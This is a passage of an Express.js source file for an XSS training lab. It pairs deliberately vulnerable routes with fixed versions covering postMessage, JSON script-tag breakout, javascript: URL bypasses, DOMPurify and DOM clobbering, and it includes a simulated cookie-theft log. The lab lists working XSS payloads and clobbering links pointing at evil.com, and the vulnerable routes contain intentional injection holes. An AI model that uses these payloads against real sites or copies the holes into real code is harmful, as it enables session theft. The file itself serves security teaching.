<span style="color:#6a9955;">// HttpOnly tells the browser: "never expose this cookie to JavaScript"</span>
<span style="color:#6a9955;">// The cookie is still sent with HTTP requests (it works for auth)</span>
<span style="color:#6a9955;">// but document.cookie cannot read it.</span></code></pre>

    <h3>What Changed</h3>
    <pre ${PRE}><code><span style="color:#f48771;text-decoration:line-through;">Set-Cookie: session_id=abc123secret; Path=/</span>
<span style="color:#89d185;">Set-Cookie: session_id=abc123secret; Path=/; HttpOnly; SameSite=Strict</span>

<span style="color:#6a9955;">// HttpOnly   — cookie invisible to document.cookie</span>
<span style="color:#6a9955;">// Secure     — cookie only sent over HTTPS (add in production)</span>
<span style="color:#6a9955;">// SameSite   — cookie not sent on cross-site requests (CSRF protection)</span></code></pre>

    <details>
      <summary>Why is this safe?</summary>
      <p><code>HttpOnly</code> makes the cookie invisible to JavaScript. Even if an attacker
      achieves XSS, <code>document.cookie</code> won't return the session cookie.</p>
      <p><strong>Important:</strong> HttpOnly doesn't prevent XSS — it limits what
      the attacker can steal. You still need to fix the XSS vulnerability itself.</p>
      <p>Think of it as <strong>damage limitation</strong>, not prevention.</p>
    </details>
  `);
});

// --- Attacker log endpoint ---
app.get("/attacker-log", (req, res) => {
  const entries = attackerLog.map((e, i) =>
    `<tr><td>${i + 1}</td><td>${escapeHtml(e.source)}</td><td><code>${escapeHtml(e.stolen)}</code></td><td>${escapeHtml(e.time)}</td></tr>`
  ).join("");
  res.type("html").send(`
    <h1>Attacker Log (Simulated)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>This simulates what an attacker's server would collect:</p>
    <table border="1" cellpadding="8" style="border-collapse:collapse;">
      <tr><th>#</th><th>Source</th><th>Stolen Cookies</th><th>Time</th></tr>
      ${entries || '<tr><td colspan="4"><em>No entries yet — try Lab 7a</em></td></tr>'}
    </table>
    <br>
    <form method="POST" action="/attacker-log-clear">
      <button type="submit">Clear log</button>
    </form>
  `);
});

app.post("/attacker-log", express.json(), (req, res) => {
  attackerLog.push({
    stolen: req.body.stolen || "",
    source: req.body.source || "unknown",
    time: new Date().toISOString()
  });
  res.json({ ok: true });
});

app.post("/attacker-log-clear", (req, res) => {
  attackerLog.length = 0;
  res.redirect("/attacker-log");
});

/* ========================================================================
   LAB 8 — Postmessage XSS
   ======================================================================== */

// --- Sender page (loaded in iframe) ---
app.get("/postmessage-sender", (req, res) => {
  res.type("html").send(`
    <html><body style="font-family:system-ui;padding:1rem;">
    <h3>Message Sender (iframe)</h3>
    <input id="msg" value="Hello from iframe!" style="width:200px;">
    <button onclick="sendMsg()">Send Message</button>
    <button onclick="sendXSS()" style="color:#c00;">Send XSS Payload</button>
    <script>
      function sendMsg() {
        window.parent.postMessage(document.getElementById("msg").value, "*");
      }
      function sendXSS() {
        window.parent.postMessage('<img src=x onerror=alert("postMessage XSS")>', "*");
      }
    </script>
    </body></html>
  `);
});

// --- 8a: Vulnerable — no origin check ---
app.get("/postmessage-xss", (req, res) => {
  res.type("html").send(`
    <h1>Lab 8a: Postmessage XSS — No Origin Check (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>This page listens for <code>postMessage</code> events and renders them with <code>innerHTML</code>
    — without checking the sender's origin.</p>

    <h3>Received message:</h3>
    <div id="output" style="border:2px solid #ccc;padding:1rem;min-height:2rem;"></div>

    <h3>Sender iframe:</h3>
    <iframe src="/postmessage-sender" style="border:1px solid #999;width:100%;height:120px;"></iframe>

    <script>
      window.addEventListener("message", function(e) {
        // No origin check! Any window/iframe can send messages here.
        document.getElementById("output").innerHTML = e.data;
      });
    </script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#4ec9b0;">window</span>.<span style="color:#dcdcaa;">addEventListener</span>(<span style="color:#ce9178;">"message"</span>, <span style="color:#c586c0;">function</span>(e) {
  <span style="color:#6a9955;">// No origin check — accepts messages from ANY source</span>

  <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">document.getElementById("output").innerHTML = e.data;</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

  <span style="color:#6a9955;">// Any iframe, popup, or window can call:</span>
  <span style="color:#6a9955;">//   targetWindow.postMessage("&lt;img onerror=alert(1)&gt;", "*")</span>
  <span style="color:#6a9955;">// and this page will render it as HTML.</span>
});</code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Victim opens this page</li>
      <li>Attacker hosts a page that opens this page in an iframe or <code>window.open</code></li>
      <li>Attacker calls <code>targetWindow.postMessage("&lt;img onerror=...&gt;", "*")</code></li>
      <li>This page receives the message and renders it as HTML via <code>innerHTML</code></li>
      <li>XSS fires in the victim's browser, in the context of this page's origin</li>
    </ol>

    <details>
      <summary>Real-world examples</summary>
      <p><code>postMessage</code> is used for OAuth popups, embedded widgets, cross-frame
      communication, and payment forms. If the receiver doesn't check the origin,
      any page can inject messages.</p>
      <p>This is especially dangerous because it bypasses same-origin policy —
      <code>postMessage</code> was specifically designed for cross-origin communication.</p>
    </details>
  `);
});

// --- 8b: Fixed — origin check ---
app.get("/postmessage-xss-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 8b: Postmessage XSS — Origin Validated (Safe)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>This page checks <code>event.origin</code> before processing messages,
    and uses <code>textContent</code> instead of <code>innerHTML</code>.</p>

    <h3>Received message:</h3>
    <div id="output" style="border:2px solid #ccc;padding:1rem;min-height:2rem;"></div>

    <h3>Sender iframe:</h3>
    <iframe src="/postmessage-sender" style="border:1px solid #999;width:100%;height:120px;"></iframe>

    <p id="status" style="color:#999;"></p>

    <script>
      var allowedOrigin = window.location.origin;
      window.addEventListener("message", function(e) {
        if (e.origin !== allowedOrigin) {
          document.getElementById("status").textContent =
            "Blocked message from " + e.origin + " (expected " + allowedOrigin + ")";
          return;
        }
        // Safe sink — textContent, not innerHTML
        document.getElementById("output").textContent = e.data;
      });
    </script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> allowedOrigin = <span style="color:#4ec9b0;">window</span>.location.origin;

<span style="color:#4ec9b0;">window</span>.<span style="color:#dcdcaa;">addEventListener</span>(<span style="color:#ce9178;">"message"</span>, <span style="color:#c586c0;">function</span>(e) {
  <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">if (e.origin !== allowedOrigin) {</span>  <span style="color:#6a9955;">// &lt;-- FIX 1: check origin</span>
    <span style="color:#c586c0;">return</span>;  <span style="color:#6a9955;">// reject messages from unknown origins</span>
  <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">}</span>

  <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">document.getElementById("output").textContent = e.data;</span>  <span style="color:#6a9955;">// &lt;-- FIX 2: safe sink</span>
});</code></pre>

    <h3>What Changed</h3>
    <pre ${PRE}><code><span style="color:#f48771;text-decoration:line-through;">// No origin check + innerHTML</span>
<span style="color:#f48771;text-decoration:line-through;">window.addEventListener("message", (e) =&gt; {</span>
<span style="color:#f48771;text-decoration:line-through;">  output.innerHTML = e.data;</span>
<span style="color:#f48771;text-decoration:line-through;">});</span>

<span style="color:#89d185;">// Origin check + textContent</span>
<span style="color:#89d185;">window.addEventListener("message", (e) =&gt; {</span>
<span style="color:#89d185;">  if (e.origin !== allowedOrigin) return;</span>
<span style="color:#89d185;">  output.textContent = e.data;</span>
<span style="color:#89d185;">});</span></code></pre>

    <details>
      <summary>Why is this safe?</summary>
      <p><strong>Fix 1:</strong> <code>e.origin</code> check ensures only messages from
      our own origin are accepted. An attacker on <code>evil.com</code> would be rejected.</p>
      <p><strong>Fix 2:</strong> <code>textContent</code> instead of <code>innerHTML</code>
      means even if the origin check is somehow bypassed, the content is rendered as
      plain text, not HTML.</p>
      <p>Defense in depth: both checks would need to fail for XSS to work.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 9 — JSON Injection in Script Tags
   ======================================================================== */

// --- 9a: Vulnerable — JSON.stringify in script tag ---
app.get("/json-injection", (req, res) => {
  const name = req.query.name || "World";
  const jsonStr = JSON.stringify({ name: name });

  res.type("html").send(`
    <h1>Lab 9a: JSON Injection in Script Tag (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Server embeds user data as JSON inside a <code>&lt;script&gt;</code> tag.</p>

    <div id="output"></div>
    <script>
      var data = ${jsonStr};
      document.getElementById("output").textContent = "Hello, " + data.name + "!";
    </script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> name = req.query.name;  <span style="color:#6a9955;">// user input</span>
<span style="color:#9cdcfe;">const</span> json = <span style="color:#4ec9b0;">JSON</span>.<span style="color:#dcdcaa;">stringify</span>({ name: name });

<span style="color:#6a9955;">// Server embeds the JSON directly in a script tag:</span>
res.<span style="color:#dcdcaa;">send</span>(&#96;
  &lt;script&gt;
    <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">var data = &#36;{json};</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>
  &lt;/script&gt;
&#96;);

<span style="color:#6a9955;">// JSON.stringify DOES escape quotes, but it does NOT escape &lt;/script&gt;</span>
<span style="color:#6a9955;">// Payload: name = &lt;/script&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
<span style="color:#6a9955;">// Result:</span>
<span style="color:#6a9955;">//   &lt;script&gt;</span>
<span style="color:#6a9955;">//     var data = {"name":"&lt;/script&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;"};</span>
<span style="color:#6a9955;">//   The browser sees &lt;/script&gt; and closes the first script block!</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker sets <code>name=&lt;/script&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
      <li>Server runs <code>JSON.stringify</code> — this escapes quotes but NOT <code>&lt;/</code></li>
      <li>Browser's HTML parser sees <code>&lt;/script&gt;</code> and closes the script block early</li>
      <li>The remaining <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> becomes a new script block</li>
      <li>XSS fires</li>
    </ol>

    <details>
      <summary>Why does JSON.stringify fail here?</summary>
      <p><code>JSON.stringify</code> is designed for JSON contexts, not HTML contexts.
      It escapes <code>"</code> and <code>\\</code> but NOT <code>&lt;/</code>.</p>
      <p>The HTML parser runs BEFORE the JavaScript parser. When it encounters
      <code>&lt;/script&gt;</code> in the string, it closes the script element —
      regardless of the JSON context.</p>
    </details>
  `);
});

// --- 9b: Fixed — escape < in JSON ---
app.get("/json-injection-fixed", (req, res) => {
  const name = req.query.name || "World";
  const safeJson = JSON.stringify({ name: name }).replace(/</g, "\\u003c");

  res.type("html").send(`
    <h1>Lab 9b: JSON Injection — Escaped (Safe)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Server escapes <code>&lt;</code> as <code>\\u003c</code> in the JSON output.</p>

    <div id="output"></div>
    <script>
      var data = ${safeJson};
      document.getElementById("output").textContent = "Hello, " + data.name + "!";
    </script>

    <h3>Alternative: Safe JSON island</h3>
    <script type="application/json" id="safe-data">${safeJson}</script>
    <script>
      var data2 = JSON.parse(document.getElementById("safe-data").textContent);
      // data2.name is safely parsed from a non-executable script block
    </script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> name = req.query.name;

<span style="color:#6a9955;">// Fix 1: Escape &lt; to prevent &lt;/script&gt; breakout</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const safeJson = JSON.stringify({ name }).replace(/&lt;/g, "\\\\u003c");</span>

res.<span style="color:#dcdcaa;">send</span>(&#96;
  &lt;script&gt;
    var data = &#36;{safeJson};  <span style="color:#6a9955;">// \\u003c is valid JSON and doesn't trigger HTML parsing</span>
  &lt;/script&gt;
&#96;);

<span style="color:#6a9955;">// Fix 2 (alternative): Use a non-executable script type</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">&lt;script type="application/json" id="data"&gt;&#36;{safeJson}&lt;/script&gt;</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">&lt;script&gt;</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">  var data = JSON.parse(document.getElementById("data").textContent);</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">&lt;/script&gt;</span></code></pre>

    <h3>What Changed</h3>
    <pre ${PRE}><code><span style="color:#f48771;text-decoration:line-through;">JSON.stringify({ name })                          // &lt;/script&gt; can break out</span>
<span style="color:#89d185;">JSON.stringify({ name }).replace(/&lt;/g, "\\u003c")  // &lt; becomes \\u003c — safe</span>

<span style="color:#6a9955;">// \\u003c is a valid JavaScript Unicode escape for &lt;</span>
<span style="color:#6a9955;">// JavaScript reads it as &lt; but the HTML parser doesn't see &lt;/script&gt;</span></code></pre>

    <details>
      <summary>Why does this work?</summary>
      <p><code>\\u003c</code> is a JavaScript Unicode escape sequence for <code>&lt;</code>.
      JavaScript understands it perfectly, but the HTML parser doesn't see a
      <code>&lt;/script&gt;</code> closing tag.</p>
      <p>The alternative approach uses <code>&lt;script type="application/json"&gt;</code>
      which the browser never executes. You parse it manually with <code>JSON.parse()</code>.
      This is the recommended pattern for embedding data in HTML.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 10 — URL Parsing Confusion
   ======================================================================== */

// --- 10a: Vulnerable — string check ---
app.get("/url-confusion", (req, res) => {
  const url = req.query.url || "";
  const passesCheck = url.includes("http");

  res.type("html").send(`
    <h1>Lab 10a: URL Parsing Confusion (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>The app checks if a URL "contains" <code>http</code> before using it as a link.</p>

    <h3>Input URL:</h3>
    <pre ${PRE}>${escapeHtml(url)}</pre>

    <h3>Naive check result:</h3>
    <p><code>url.includes("http") = ${passesCheck}</code></p>

    ${passesCheck
      ? `<p>Link: <a id="link" href="${escapeHtml(url)}">Click here</a></p>
         <p style="color:#c00;"><strong>Warning:</strong> This link may execute JavaScript!</p>`
      : `<p style="color:#999;">URL rejected (doesn't contain "http")</p>`}

    <h3>Try these payloads:</h3>
    <ul>
      <li><a class="vuln" href="/url-confusion?url=javascript:alert('XSS')//http://legit.com"><code>javascript:alert('XSS')//http://legit.com</code></a> — passes check!</li>
      <li><a class="vuln" href="/url-confusion?url=javascript:alert('XSS')"><code>javascript:alert('XSS')</code></a> — blocked (no "http")</li>
      <li><a class="vuln" href="/url-confusion?url=JAVASCRIPT:alert('XSS')//http://x"><code>JAVASCRIPT:alert('XSS')//http://x</code></a> — case variation</li>
      <li><a class="vuln" href="/url-confusion?url=data:text/html,<script>alert('XSS')</script>//http://x"><code>data:text/html,...</code></a> — data URI</li>
    </ul>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> url = req.query.url;

<span style="color:#6a9955;">// Naive check: does the URL "contain" http?</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">if (url.includes("http")) {</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>
  <span style="color:#6a9955;">// This passes for:</span>
  <span style="color:#6a9955;">//   javascript:alert(1)//http://legit.com</span>
  <span style="color:#6a9955;">//   ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^</span>
  <span style="color:#6a9955;">//   actual protocol     "http" is just a comment!</span>
  res.<span style="color:#dcdcaa;">send</span>(&#96;&lt;a href="&#36;{url}"&gt;Click&lt;/a&gt;&#96;);
}</code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker provides <code>javascript:alert('XSS')//http://legit.com</code></li>
      <li>The <code>includes("http")</code> check passes — "http" appears in the string</li>
      <li>But the actual protocol is <code>javascript:</code></li>
      <li><code>//http://legit.com</code> is just a JavaScript comment</li>
      <li>User clicks the link, JavaScript executes</li>
    </ol>

    <details>
      <summary>Why string checks fail</summary>
      <p>String-based URL validation is fundamentally broken because URLs have
      complex syntax with protocols, usernames, fragments, and encoding.</p>
      <p><code>javascript:alert(1)//http://x</code> — the <code>//</code> starts
      a JS comment, so <code>http://x</code> is ignored by the engine but fools
      the string check.</p>
      <p>Other bypasses: <code>JAVASCRIPT:</code> (case), <code>data:</code> URIs,
      <code>vbscript:</code> (IE), URL encoding (<code>%6a%61%76%61...</code>).</p>
    </details>
  `);
});

// --- 10b: Fixed — URL object protocol check ---
app.get("/url-confusion-fixed", (req, res) => {
  const url = req.query.url || "";
  let parsed = null;
  let error = null;
  let isSafe = false;

  try {
    parsed = new URL(url);
    isSafe = ["http:", "https:"].includes(parsed.protocol);
  } catch (e) {
    error = e.message;
  }

  res.type("html").send(`
    <h1>Lab 10b: URL Parsing — Protocol Check (Safe)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>The app parses the URL with <code>new URL()</code> and checks the <code>.protocol</code> property.</p>

    <h3>Input URL:</h3>
    <pre ${PRE}>${escapeHtml(url)}</pre>

    <h3>Parsed result:</h3>
    ${error
      ? `<p style="color:#c00;">Parse error: ${escapeHtml(error)}</p>`
      : `<pre ${PRE}>protocol: ${escapeHtml(parsed.protocol)}
hostname: ${escapeHtml(parsed.hostname)}
pathname: ${escapeHtml(parsed.pathname)}</pre>`}

    <h3>Protocol check:</h3>
    ${isSafe
      ? `<p style="color:#070;"><strong>Allowed</strong> — protocol is ${escapeHtml(parsed.protocol)}</p>
         <p>Link: <a href="${escapeHtml(url)}">Click here</a></p>`
      : `<p style="color:#c00;"><strong>Blocked</strong> — protocol ${parsed ? `"${escapeHtml(parsed.protocol)}"` : "(invalid)"} is not http: or https:</p>`}

    <h3>Try the same payloads:</h3>
    <ul>
      <li><a href="/url-confusion-fixed?url=javascript:alert('XSS')//http://legit.com"><code>javascript:alert(...)//http://...</code></a> — blocked! protocol is javascript:</li>
      <li><a href="/url-confusion-fixed?url=https://example.com"><code>https://example.com</code></a> — allowed</li>
      <li><a href="/url-confusion-fixed?url=data:text/html,<script>alert(1)</script>"><code>data:text/html,...</code></a> — blocked! protocol is data:</li>
    </ul>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> url = req.query.url;

<span style="color:#c586c0;">try</span> {
  <span style="color:#9cdcfe;">const</span> parsed = <span style="color:#9cdcfe;">new</span> <span style="color:#4ec9b0;">URL</span>(url);

  <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">if (["http:", "https:"].includes(parsed.protocol)) {</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
    <span style="color:#6a9955;">// Only allow http: and https: protocols</span>
    res.<span style="color:#dcdcaa;">send</span>(&#96;&lt;a href="&#36;{url}"&gt;Click&lt;/a&gt;&#96;);
  } <span style="color:#c586c0;">else</span> {
    res.<span style="color:#dcdcaa;">send</span>(<span style="color:#ce9178;">"Blocked: invalid protocol"</span>);
  }
} <span style="color:#c586c0;">catch</span> (e) {
  res.<span style="color:#dcdcaa;">send</span>(<span style="color:#ce9178;">"Blocked: invalid URL"</span>);
}</code></pre>

    <h3>What Changed</h3>
    <pre ${PRE}><code><span style="color:#f48771;text-decoration:line-through;">url.includes("http")                           // string check — easily bypassed</span>
<span style="color:#89d185;">new URL(url).protocol === "https:"              // structural check — reliable</span>

<span style="color:#6a9955;">// new URL() parses the URL the same way the browser does.</span>
<span style="color:#6a9955;">// .protocol returns the ACTUAL protocol, not a substring match.</span>
<span style="color:#6a9955;">// "javascript:alert(1)//http://x" → protocol = "javascript:"</span></code></pre>

    <details>
      <summary>Why is this safe?</summary>
      <p><code>new URL()</code> parses URLs using the same algorithm as the browser.
      The <code>.protocol</code> property returns the actual protocol, not a substring.</p>
      <p>For <code>javascript:alert(1)//http://x</code>, <code>.protocol</code>
      correctly returns <code>"javascript:"</code> — which our allowlist rejects.</p>
      <p><strong>Rule of thumb:</strong> Always <strong>allowlist</strong> safe protocols
      rather than <strong>blocklist</strong> dangerous ones. New dangerous protocols
      could appear, but <code>https:</code> will always be safe.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 11 — DOMPurify Sanitizer
   ======================================================================== */

let createDOMPurify, JSDOM, DOMPurify;
try {
  createDOMPurify = require("dompurify");
  JSDOM = require("jsdom").JSDOM;
  const window = new JSDOM("").window;
  DOMPurify = createDOMPurify(window);
} catch (e) {
  // dompurify/jsdom not installed — labs will show install instructions
  DOMPurify = null;
}

// --- 11a: DOMPurify demo ---
app.get("/dompurify-demo", (req, res) => {
  const defaultInput = `<b>Bold</b> <i>italic</i> <a href="https://example.com">safe link</a>
<img src="https://via.placeholder.com/60" alt="safe image">
<script>alert('XSS')<\/script>
<img src=x onerror=alert('XSS')>
<a href="javascript:alert('XSS')">evil link</a>
<div onmouseover="alert('XSS')">hover me</div>`;
  const input = req.query.html || defaultInput;

  if (!DOMPurify) {
    return res.type("html").send(`
      <h1>Lab 11: DOMPurify — Not Installed</h1>
      <p><a href="/">Back to labs</a></p>
      <p>Run <code>npm install dompurify jsdom</code> and restart the server.</p>
    `);
  }

  const clean = DOMPurify.sanitize(input);

  res.type("html").send(`
    <h1>Lab 11a: DOMPurify Sanitizer (Safe)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>DOMPurify strips dangerous HTML while keeping safe formatting tags.</p>

    <form method="GET">
      <textarea name="html" rows="6" cols="80" style="font-family:monospace;">${escapeHtml(input)}</textarea><br>
      <button type="submit">Sanitize</button>
    </form>

    <h3>Raw Input (would be dangerous):</h3>
    <pre ${PRE}>${escapeHtml(input)}</pre>

    <h3>DOMPurify Output (safe HTML):</h3>
    <pre ${PRE}>${escapeHtml(clean)}</pre>

    <h3>Rendered (sanitized):</h3>
    <div style="border:2px solid #070;padding:1rem;border-radius:6px;">${clean}</div>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> createDOMPurify = <span style="color:#dcdcaa;">require</span>(<span style="color:#ce9178;">"dompurify"</span>);
<span style="color:#9cdcfe;">const</span> { JSDOM } = <span style="color:#dcdcaa;">require</span>(<span style="color:#ce9178;">"jsdom"</span>);
<span style="color:#9cdcfe;">const</span> window = <span style="color:#9cdcfe;">new</span> <span style="color:#4ec9b0;">JSDOM</span>(<span style="color:#ce9178;">""</span>).window;
<span style="color:#9cdcfe;">const</span> DOMPurify = <span style="color:#dcdcaa;">createDOMPurify</span>(window);

<span style="color:#9cdcfe;">const</span> userInput = req.query.html;

<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const clean = DOMPurify.sanitize(userInput);</span>  <span style="color:#6a9955;">// &lt;-- THE KEY LINE</span>

<span style="color:#6a9955;">// What DOMPurify strips:</span>
<span style="color:#6a9955;">//   &lt;script&gt;...&lt;/script&gt;   → removed entirely</span>
<span style="color:#6a9955;">//   onerror=alert(...)     → attribute removed</span>
<span style="color:#6a9955;">//   href="javascript:..."  → attribute removed</span>
<span style="color:#6a9955;">//   onmouseover=...        → attribute removed</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// What DOMPurify keeps:</span>
<span style="color:#6a9955;">//   &lt;b&gt;, &lt;i&gt;, &lt;a href="https://..."&gt;, &lt;img src="https://..."&gt;</span>

res.<span style="color:#dcdcaa;">send</span>(&#96;&lt;div&gt;&#36;{clean}&lt;/div&gt;&#96;);  <span style="color:#6a9955;">// safe to render as HTML</span></code></pre>

    <details>
      <summary>When to use DOMPurify</summary>
      <p>Use DOMPurify when you need to render user-provided HTML:
      rich text editors, markdown output, CMS content, HTML emails.</p>
      <p><strong>Don't use it</strong> when you just need plain text — use
      <code>textContent</code> or <code>escapeHtml()</code> instead. DOMPurify
      is for when you intentionally want to allow some HTML formatting.</p>
    </details>
  `);
});

// --- 11b: DOMPurify limitations ---
app.get("/dompurify-bypass", (req, res) => {
  res.type("html").send(`
    <h1>Lab 11b: DOMPurify Limitations</h1>
    <p><a href="/">Back to labs</a></p>
    <p>DOMPurify is excellent at what it does, but it has boundaries.</p>

    <h3>What DOMPurify does NOT protect against:</h3>
    <table border="1" cellpadding="8" style="border-collapse:collapse;font-size:0.95em;">
      <tr><th>Attack</th><th>Why DOMPurify can't help</th></tr>
      <tr><td>Logic bugs</td><td>If your app misuses the sanitized output (e.g., puts it in a <code>javascript:</code> URL), that's not an HTML sanitization problem</td></tr>
      <tr><td>CSS injection</td><td>DOMPurify allows <code>&lt;style&gt;</code> by default — CSS can exfiltrate data via <code>background:url(...)</code></td></tr>
      <tr><td>DOM Clobbering</td><td>DOMPurify allows <code>id</code> and <code>name</code> attributes by default (see Lab 12). Use <code>SANITIZE_DOM: true</code> config.</td></tr>
      <tr><td>Server-side context</td><td>DOMPurify sanitizes HTML. If you embed output in a <code>&lt;script&gt;</code> block or URL, it won't help.</td></tr>
    </table>

    <h3>DOMPurify Configuration</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Strict mode — only allow specific tags and attributes</span>
DOMPurify.<span style="color:#dcdcaa;">sanitize</span>(input, {
  <span style="color:#9cdcfe;">ALLOWED_TAGS</span>: [<span style="color:#ce9178;">"b"</span>, <span style="color:#ce9178;">"i"</span>, <span style="color:#ce9178;">"a"</span>, <span style="color:#ce9178;">"p"</span>, <span style="color:#ce9178;">"br"</span>],
  <span style="color:#9cdcfe;">ALLOWED_ATTR</span>: [<span style="color:#ce9178;">"href"</span>],
  <span style="color:#9cdcfe;">ALLOW_DATA_ATTR</span>: <span style="color:#569cd6;">false</span>,
});

<span style="color:#6a9955;">// Prevent DOM Clobbering</span>
DOMPurify.<span style="color:#dcdcaa;">sanitize</span>(input, {
  <span style="color:#9cdcfe;">SANITIZE_DOM</span>: <span style="color:#569cd6;">true</span>,       <span style="color:#6a9955;">// strip id/name that match DOM properties</span>
  <span style="color:#9cdcfe;">SANITIZE_NAMED_PROPS</span>: <span style="color:#569cd6;">true</span>, <span style="color:#6a9955;">// strip name attributes entirely</span>
});

<span style="color:#6a9955;">// Return SafeHTML (Trusted Types compatible)</span>
DOMPurify.<span style="color:#dcdcaa;">sanitize</span>(input, { <span style="color:#9cdcfe;">RETURN_TRUSTED_TYPE</span>: <span style="color:#569cd6;">true</span> });</code></pre>

    <details>
      <summary>Key takeaway</summary>
      <p>DOMPurify is the best tool for HTML sanitization, but it's not a magic
      bullet. It protects against HTML/SVG/MathML injection — that's it.</p>
      <p>You still need CSP, output encoding, and proper architecture.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 12 — DOM Clobbering
   ======================================================================== */

// --- 12a: Vulnerable — window.config can be clobbered ---
app.get("/dom-clobbering", (req, res) => {
  const inject = req.query.inject || "";
  res.type("html").send(`
    <h1>Lab 12a: DOM Clobbering (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>This page reads <code>window.config</code> to get the API URL.
    An attacker can inject HTML that overrides this global.</p>

    <h3>Injected HTML:</h3>
    <div id="injected">${inject}</div>

    <h3>API URL resolved:</h3>
    <pre id="result" ${PRE}></pre>

    <script>
      // If window.config exists (from DOM element), use it; otherwise default
      var apiUrl = window.config ? (window.config.href || window.config.toString()) : "https://api.legit.com/v1";
      document.getElementById("result").textContent =
        "apiUrl = " + JSON.stringify(apiUrl) +
        "\\nwindow.config = " + window.config +
        "\\ntype = " + typeof window.config;
    </script>

    <h3>Try these payloads:</h3>
    <ul>
      <li><a class="vuln" href="/dom-clobbering?inject=<a id=config href=https://evil.com/api>"><code>&lt;a id=config href=https://evil.com/api&gt;</code></a> — overrides window.config</li>
      <li><a class="vuln" href="/dom-clobbering?inject=<form id=config><input name=apiUrl value=https://evil.com>"><code>&lt;form id=config&gt;...&lt;/form&gt;</code></a> — creates window.config.apiUrl</li>
    </ul>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// HTML elements with id or name create global variables!</span>
<span style="color:#6a9955;">// &lt;a id="config" href="https://evil.com"&gt; → window.config === that element</span>
<span style="color:#6a9955;">// &lt;form id="config"&gt;&lt;input name="apiUrl" ...&gt; → window.config.apiUrl</span>

<span style="color:#6a9955;">// The vulnerable code reads from window.config:</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">var apiUrl = window.config</span>  <span style="color:#f44747;">// &lt;-- THE BUG: can be clobbered by DOM</span>
  <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">? window.config.href</span>
  <span style="color:#6a9955;">: "https://api.legit.com/v1";</span>

<span style="color:#dcdcaa;">fetch</span>(apiUrl)  <span style="color:#6a9955;">// now points to attacker's server!</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Page expects <code>window.config</code> to be undefined (falls back to legit URL)</li>
      <li>Attacker injects <code>&lt;a id="config" href="https://evil.com"&gt;</code></li>
      <li>Browser auto-creates <code>window.config</code> pointing to the <code>&lt;a&gt;</code> element</li>
      <li><code>window.config.href</code> returns <code>"https://evil.com"</code></li>
      <li>App fetches from the attacker's server — <strong>no script execution needed!</strong></li>
    </ol>

    <details>
      <summary>Why is DOM Clobbering special?</summary>
      <p>DOM Clobbering doesn't execute JavaScript — it only injects HTML.
      This means it <strong>bypasses CSP entirely</strong> (CSP only restricts scripts).</p>
      <p>It works because the HTML spec says elements with <code>id</code> become
      properties of <code>window</code>. This is legacy behavior that can't be removed.</p>
    </details>
  `);
});

// --- 12b: Fixed — const declaration ---
app.get("/dom-clobbering-fixed", (req, res) => {
  const inject = req.query.inject || "";
  res.type("html").send(`
    <h1>Lab 12b: DOM Clobbering — Fixed</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Using <code>const config = Object.freeze({...})</code> prevents DOM clobbering.</p>

    <h3>Injected HTML (same payload):</h3>
    <div id="injected">${inject}</div>

    <h3>API URL resolved:</h3>
    <pre id="result" ${PRE}></pre>

    <script>
      // const declaration SHADOWS any DOM-clobbered window.config
      const config = Object.freeze({ apiUrl: "https://api.legit.com/v1" });
      document.getElementById("result").textContent =
